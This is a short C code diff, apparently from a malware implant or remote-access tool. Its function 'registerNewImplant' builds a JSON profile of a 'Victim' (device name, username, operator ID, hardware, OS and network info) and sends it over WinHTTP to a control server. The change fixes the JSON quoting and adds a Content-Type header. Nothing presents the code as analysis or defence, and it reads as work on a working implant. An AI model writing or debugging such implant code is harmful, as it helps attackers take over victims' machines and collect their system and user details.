@@ -213,18 +213,23 @@ void registerNewImplant(Victim* victim) {
         "\"ID\": \"%s\","
         "\"DeviceName\": \"%s\","
         "\"Username\": \"%s\","
-        "\"OperatorID\": %s,"
+        "\"OperatorID\": \"%s\","
         "\"CPUArchitecture\": \"%s\","
         "\"GPUInfo\": \"%s\","
-        "\"RAMInfo\": %s,"
+        "\"RAMInfo\": \"%s\","
         "\"OSName\": \"%s\","
         "\"NetworkInfo\": \"%s\","
-        "\"CurrentDate\": \"%s\""
+        "\"CurrentDate\":\"%s\""
         "}",
         victim->ID, victim->DeviceName, victim->Username, victim->OperatorID, victim->CPUArchitecture, victim->GPUInfo, victim->RAMInfo, victim->OSName, victim->NetworkInfo, "2023-08-06T15:04:05.07Z");
 
+    // Print the constructed data to the console
+    printf("Constructed JSON Data:\n%s\n", data);
+
+    WCHAR* headers = L"Content-Type: application/json";
+
     // Send the request
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, strlen(data), strlen(data), 0)) {
+    if (!WinHttpSendRequest(hRequest, headers, wcslen(headers), data, strlen(data), strlen(data), 0)) {
         printf("Error %u in WinHttpSendRequest.\n", GetLastError());
     }
     else {
